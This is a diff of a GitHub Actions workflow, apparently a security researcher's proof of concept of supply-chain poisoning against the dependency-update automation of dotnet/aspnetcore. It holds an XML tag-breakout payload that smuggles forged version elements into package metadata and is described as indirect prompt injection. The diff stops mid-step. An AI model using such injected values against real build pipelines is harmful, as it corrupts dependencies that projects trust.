@@ -1,22 +1,20 @@
-name: "Supply Chain Attack PoC: Indirect Prompt Injection"
-# Researcher: HackerMD (Mohamadisha Shaikh)
-# Target: Automated Dependency Update Logic in dotnet/aspnetcore
+name: "PoC: Supply Chain Integrity Bypass"
+# Researcher: HackerMD
+# Security Concern: Indirect Prompt Injection via Untrusted NuGet Metadata
 
 on:
-  workflow_dispatch: # Manual trigger for security audit validation
+  workflow_dispatch:
 
 jobs:
-  exploit-verification:
-    name: "Supply Chain Integrity Check"
+  exploit-validation:
+    name: "Simulate Supply Chain Poisoning"
     runs-on: ubuntu-latest
     steps:
-      - name: "Environment Setup"
+      - name: "Clone Repository Infrastructure"
         uses: actions/checkout@v4
 
-      - name: "Simulate Malicious Upstream Source"
+      - name: "Simulate Malicious Upstream Metadata"
         id: upstream
-        run: |
-          # Professional Strategy: XML Tag Breakout
-          # This simulates a malicious package version from NuGet that tricks the bot's parser.
-          # We inject multiple core versions and comment out the rest of the line.
-          INJECTION_PAYLOAD='1.2.3</SeleniumWebDriverVersion><AspNetCoreMajorVersion>666</AspNetCoreMajorVersion><SystemMemoryVersion>9.9.9</SystemMemoryVersion>
+        # Using environment variables to safely handle special XML characters
+        env:
+          PAYLOAD: "1.2.3</SeleniumWebDriverVersion><AspNetCoreMajorVersion>666</AspNetCoreMajorVersion><SystemMemoryVersion>9.9.9</SystemMemoryVersion>
